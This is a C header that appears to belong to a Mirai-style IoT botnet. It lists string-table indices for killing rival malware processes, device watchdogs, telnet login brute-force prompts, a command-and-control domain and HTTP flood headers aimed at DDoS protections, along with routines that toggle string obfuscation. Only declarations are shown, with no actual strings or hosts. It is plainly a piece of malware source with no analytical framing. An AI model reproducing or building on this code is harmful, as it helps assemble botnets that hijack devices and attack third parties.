#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_INSTANCE_EXISTS 2
#define TABLE_KILLER_PROC 3
#define TABLE_KILLER_EXE 4
#define TABLE_KILLER_FD 5
#define TABLE_KILLER_TCP 6
#define TABLE_KILLER_STATUS 7
#define TABLE_KILLER_CMDLINE 8
#define TABLE_KILLER_TMP 9
#define TABLE_KILLER_DATALOCAL 10
#define TABLE_KILLER_QTX 11
#define TABLE_KILLER_DOT 12
#define TABLE_KILLER_ARM 13
#define TABLE_KILLER_X86 14
#define TABLE_KILLER_SH4 15
#define TABLE_KILLER_MIPS 16
#define TABLE_KILLER_MPSL 17
#define TABLE_KILLER_SDA 18
#define TABLE_KILLER_MTD 19
#define TABLE_WATCHDOG_1 20
#define TABLE_WATCHDOG_2 21
#define TABLE_WATCHDOG_3 22
#define TABLE_WATCHDOG_4 23
#define TABLE_WATCHDOG_5 24
#define TABLE_WATCHDOG_6 25
#define TABLE_WATCHDOG_7 26
#define TABLE_WATCHDOG_8 27
#define TABLE_WATCHDOG_9 28
#define TABLE_RANDOM 29
#define TABLE_SCAN_SHELL 30
#define TABLE_SCAN_ENABLE 31
#define TABLE_SCAN_SYSTEM 32
#define TABLE_SCAN_SH 33
#define TABLE_SCAN_LSHELL 34
#define TABLE_SCAN_QUERY 35
#define TABLE_SCAN_RESP 36
#define TABLE_SCAN_NCORRECT 37
#define TABLE_SCAN_ASSWORD 38
#define TABLE_SCAN_OGIN 39
#define TABLE_SCAN_ENTER 40
#define TABLE_CNC_DOMAIN 41
#define TABLE_SCAN_DOMAIN 42
#define TABLE_KILLER_MAPS 43
#define TABLE_KILLER_QTX2 44
#define TABLE_KILLER_HAKAI 45
#define TABLE_ATK_KEEP_ALIVE            46
#define TABLE_ATK_ACCEPT                47
#define TABLE_ATK_ACCEPT_LNG            48
#define TABLE_ATK_CONTENT_TYPE          49
#define TABLE_ATK_SET_COOKIE            50
#define TABLE_ATK_REFRESH_HDR           51
#define TABLE_ATK_LOCATION_HDR          52
#define TABLE_ATK_SET_COOKIE_HDR        53
#define TABLE_ATK_CONTENT_LENGTH_HDR    54
#define TABLE_ATK_TRANSFER_ENCODING_HDR 55
#define TABLE_ATK_CHUNKED               56
#define TABLE_ATK_KEEP_ALIVE_HDR        57
#define TABLE_ATK_CONNECTION_HDR        58
#define TABLE_ATK_DOSARREST             59
#define TABLE_ATK_CLOUDFLARE_NGINX      60
#define TABLE_HTTP_1                  	61
#define TABLE_HTTP_2                  	62
#define TABLE_HTTP_3                	63
#define TABLE_HTTP_4                 	64 
#define TABLE_HTTP_5                 	65
#define TABLE_HTTP_6                 	66
#define TABLE_HTTP_7                 	67
#define TABLE_HTTP_8                 	68
#define TABLE_HTTP_9                 	69
#define TABLE_HTTP_10                 	70
#define TABLE_HTTP_11                 	71
#define TABLE_HTTP_12                 	72
#define TABLE_HTTP_13                 	73
#define TABLE_HTTP_14                 	74
#define TABLE_HTTP_15                 	75
#define TABLE_MISC_RANDOM               76
#define TABLE_ATK_VSE                   77
#define TABLE_ATK_RESOLVER              78
#define TABLE_ATK_NSERV                 79

#define TABLE_MAX_KEYS 80

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
